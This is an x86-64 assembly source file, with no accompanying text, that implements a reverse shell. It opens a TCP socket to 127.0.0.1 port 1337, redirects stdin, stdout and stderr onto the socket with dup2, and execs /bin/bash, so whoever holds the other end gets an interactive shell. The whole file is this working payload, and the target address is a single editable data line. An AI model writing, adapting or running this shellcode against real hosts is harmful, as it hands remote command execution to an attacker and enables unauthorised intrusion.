global _start

section .text

_start:
    ; create socket
    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    mov rax, 41
    syscall
    mov [sock_fd], rax
    
    ; connect socket
    mov rdi, rax
    mov rsi, sock_addr
    mov rdx, 16
    mov rax, 42 
    syscall

    mov rax, 33
    mov rdi, [sock_fd]
    mov rsi, 0
    syscall

    mov rax, 33
    mov rdi, [sock_fd]
    mov rsi, 1
    syscall

    mov rax, 33
    mov rdi, [sock_fd]
    mov rsi, 2
    syscall

    mov rax, 59
    mov rdi, shell
    mov rsi, 0
    mov rdx, 0
    syscall

    mov rax, 60
    mov rdi, 0
    syscall

section .bss
    read_buf: resb 5
    sock_fd: resq 1

section .data
    sock_addr: db 0x02,0x00,0x05,0x39,0x7f,0x00,0x00,0x01
    shell: db "/bin/bash",0
